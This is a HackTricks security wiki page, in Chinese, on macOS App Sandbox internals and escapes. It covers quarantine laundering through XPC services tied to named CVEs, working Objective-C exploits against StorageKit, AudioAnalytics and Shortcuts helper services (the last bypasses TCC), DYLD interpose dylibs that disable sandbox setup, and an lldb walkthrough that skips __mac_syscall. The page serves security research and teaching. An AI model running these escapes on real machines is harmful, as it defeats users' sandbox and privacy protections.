# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox 加载过程

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>图片来源：<a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

在上图中，可以观察到当运行具有 **`com.apple.security.app-sandbox`** entitlement 的应用程序时，**Sandbox 将如何加载**。

编译器会将 `/usr/lib/libSystem.B.dylib` 链接到二进制文件。

然后，**`libSystem.B`** 会调用多个函数，直到 **`xpc_pipe_routine`** 将应用程序的 entitlements 发送给 **`securityd`**。Securityd 会检查该进程是否应被隔离在 Sandbox 中；如果需要，则将其隔离。\
最后，通过调用 **`__sandbox_ms`** 激活 Sandbox，而该函数会调用 **`__mac_syscall`**。<sup>[[1]](#references)[[3]](#references)</sup>

## 可能的 Bypass

### 绕过 quarantine attribute

**由 sandboxed 进程创建的文件**会被附加 **quarantine attribute**，以防止 sandbox escape：如果你放置一个新应用程序并尝试启动它，quarantine 标志会阻止其运行。因此，**如果你可以放置一个没有 quarantine attribute 的文件或文件夹，就可以逃出 App Sandbox**——只需放置一个 `.app` bundle，然后使用 `open` 启动它，因为新启动的进程会在 LaunchServices 下运行，而不是在你的 Sandbox 下运行。

获得 **unquarantined drop** 的可靠方法是让**另一个进程代你创建文件**。正如 Mickey Jin 在 [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) 中所记录的，**App Sandbox** 会用 quarantine 标记被放置的文件，但运行在 Service Sandbox 下的 XPC services 不会这样做。因此，多个未经身份验证的 XPC services 可以被用作“quarantine laundering”原语：<sup>[[4]](#references)</sup>

- **CVE-2023-27944**（`TrialArchivingService`）和 **CVE-2023-32414**（`ArchiveService`）：将 sandboxed app 传入的 archive 解压到指定位置，**不会将 quarantine xattr 传播**到解压后的内容。
- **CVE-2023-42977**（`PerfPowerServicesSignpostReader`）：`submitSignpostDataWithConfig:` 中的 path traversal 允许创建**没有 quarantine 的任意目录**，这足以在 container 外部构建完整的 `.app` bundle 结构。
- **CVE-2024-27864**（`diskimagescontroller.xpc`）：挂载带有 quarantine 的 DMG，**但不会对生成的设备进行 quarantine**，因此挂载卷上的应用程序可以被启动。

> [!TIP]
> 解压通常会**移除 executable permission bit**。CVE-2023-27944 使用的 workaround 是将一个现有的、已签名的系统二进制文件（例如 `/System/Library/CoreServices/Automator Application Stub`）的**符号链接**放置为 bundle 的主 executable，这样即使被放置的文件没有 `+x`，它仍然可以被启动。

> [!CAUTION]
> 之所以可行，是因为检查由被启动项目上的**标志**驱动：*“当应用程序或其他 executable code 通过 Finder 或 GUI 运行时，macOS 会在加载之前检查其 quarantine 标志”*，然后才会将其*“交给 Gatekeeper 执行完整的‘首次运行’安全检查”*（[Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)）。你启动的 bundle 上没有标志，就不会经过 Gatekeeper 检查——这正是上述 CVE 提供的原语。<sup>[[5]](#references)</sup>
>
> 请注意，如果一个 `.app` bundle 已经被授权运行（其具有带有“authorized to run”标志的 quarantine xattr），你也可以利用它……但此时，除非拥有某些特权 TCC 权限，否则你无法写入 **`.app`** bundles（而在 Sandbox 内部你不会拥有这些权限）。

### 滥用 Open 功能

在[**Word Sandbox Bypass 的最后几个示例**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv)中，可以看到如何滥用 **`open`** CLI 功能来绕过 Sandbox。


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

即使应用程序** intended to be sandboxed**（`com.apple.security.app-sandbox`），例如从 LaunchAgent（`~/Library/LaunchAgents`）执行它时，也可能绕过 Sandbox。\
正如[**这篇文章**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)所解释的，如果你想通过一个 sandboxed 应用程序实现 persistence，可以让它作为 LaunchAgent 自动执行，并可能通过 DyLib environment variables 注入恶意代码。<sup>[[6]](#references)</sup>

### 滥用 Auto Start Locations

如果一个 sandboxed 进程可以**写入**某个位置，而**之后一个 unsandboxed 应用程序会在该位置运行该二进制文件**，那么它只需**将二进制文件放置**在那里，就能够**逃出 Sandbox**。这类位置的一个典型例子是 `~/Library/LaunchAgents` 或 `/System/Library/LaunchDaemons`。

为此，你甚至可能需要执行**两个步骤**：让一个具有**更宽松 Sandbox**（`file-read*`、`file-write*`）的进程执行你的代码，而该代码实际上会将内容写入一个之后会被**以 unsandboxed 方式执行**的位置。

查看此页面了解 **Auto Start locations**：


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### 滥用其他进程

如果你能够从该 sandbox 进程中**攻陷**运行在限制较少的 Sandbox（或没有 Sandbox）中的其他进程，那么你就能够逃入它们的 Sandbox：


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### 可用的 System 和 User Mach services

Sandbox 还允许通过 `application.sb` profile 中定义的 XPC 与某些 **Mach services** 通信。如果你能够**滥用**其中某项 service，就可能**逃出 Sandbox**。

如[这篇 writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)所述，Mach services 的信息存储在 `/System/Library/xpc/launchd.plist` 中。通过在该文件中搜索 `<string>System</string>` 和 `<string>User</string>`，可以找到所有 System 和 User Mach services。<sup>[[4]](#references)</sup>

此外，还可以通过调用 `bootstrap_look_up` 来检查某个 Mach service 是否可供 sandboxed application 使用：
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### 可用的 PID Mach services

这些 Mach services 最初被滥用来[在这篇文章中逃逸 sandbox](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)。当时，应用及其 framework **所需的所有 XPC services** 都能在应用的 PID domain 中看到（这些是 `ServiceType` 为 `Application` 的 Mach Services）。<sup>[[4]](#references)</sup>

要**联系 PID Domain XPC service**，只需在应用中使用类似以下的一行代码将其注册：
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
此外，可以在 `System/Library/xpc/launchd.plist` 中搜索 `<string>Application</string>`，以找到所有 **Application** Mach services。

查找有效 xpc services 的另一种方法是检查以下位置中的服务：
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
可以在[**原始文章**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)中找到多个滥用此技术的示例，不过，以下是一些总结后的示例。<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

该服务通过始终返回 `YES` 来允许所有 XPC 连接，而方法 `runTask:arguments:withReply:` 会使用任意参数执行任意命令。

该 exploit “简单到”：
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

此 XPC service 始终返回 `YES`，因此允许所有 client；而 `createZipAtPath:hourThreshold:withReply:` 方法接受文件夹路径，并将其压缩为 ZIP 文件。

因此，可以生成一个伪造的 app 文件夹结构，将其压缩，然后解压并执行它以 escape sandbox，因为新文件不会具有 quarantine 属性。

该 exploit 如下：
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

此 XPC service 可通过方法 `extendAccessToURL:completion:` 向 XPC client 授予对任意 URL 的读写权限，该方法接受任何连接。由于该 XPC service 具有 FDA，因此可以滥用这些权限来完全绕过 TCC。

该 exploit 的实现方式是：
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### 静态编译与动态 linking

[**这项研究**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) 发现了 2 种绕过 Sandbox 的方法。因为 Sandbox 会在加载 **libSystem** library 时从 userland 应用。如果 binary 能够避免加载它，就永远不会被 Sandbox 保护：<sup>[[2]](#references)</sup>

- 如果 binary 是**完全静态编译**的，就可以避免加载该 library。
- 如果 **binary 不需要加载任何 libraries**（因为 linker 也位于 libSystem 中），它就不需要加载 libSystem。

### Shellcodes

注意，即使是 **shellcodes**，在 ARM64 中也需要链接到 `libSystem.dylib`：
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### 未继承的限制

正如这篇 writeup 的 **[bonus](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)** 中所解释的，类似于以下内容的 sandbox 限制：<sup>[[4]](#references)</sup>
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
可被新进程绕过，例如执行：
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
然而，当然，这个新进程不会继承父进程的 entitlements 或权限。

### Entitlements

请注意，即使某些 **actions** 在应用程序具有特定 **entitlement** 时可能会被 **sandbox** **允许**，例如：
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

有关 **Interposting** 的更多信息，请查看：


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` 以阻止 sandbox
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall` 以防止 Sandbox
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### 使用 lldb 调试和绕过 Sandbox

让我们编译一个应当受到 Sandbox 限制的应用程序：

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

然后编译该应用：
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> 应用将尝试 **读取** 文件 **`~/Desktop/del.txt`**，但 **Sandbox 不会允许此操作**。\
> 在其中创建一个文件，因为绕过 Sandbox 后，它将能够读取该文件：
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

让我们调试该应用程序，以查看 Sandbox 何时被加载：
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **即使绕过了 Sandbox，TCC** 仍会询问用户是否允许该进程读取桌面中的文件

## References

- [1] [Jonathan Levin - Apple Sandbox：深入泥潭（HITB GSEC 2016 slides）](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Mac App Store Sandbox Escape](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Apple Sandbox：深入泥潭（HITB GSEC 2016）](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - macOS Sandbox Escapes 的新时代](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - 解释：Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox)：使用 DyLib Injection 通过 Telegram 绕过 macOS TCC（Part 2）](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
{{#include ../../../../../banners/hacktricks-training.md}}
